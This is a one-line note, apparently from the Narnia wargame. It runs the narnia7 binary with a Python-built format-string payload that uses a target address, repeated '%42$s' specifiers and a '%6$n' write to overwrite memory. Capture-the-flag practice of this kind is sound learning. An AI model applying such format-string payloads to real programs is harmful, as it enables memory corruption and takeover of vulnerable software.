#format_string
./narnia7 `python -c "print '\xbc\xcf\xff\xff' + '%42\\$s' * 0x100 + '%6\\$n' + 'A'*200"`
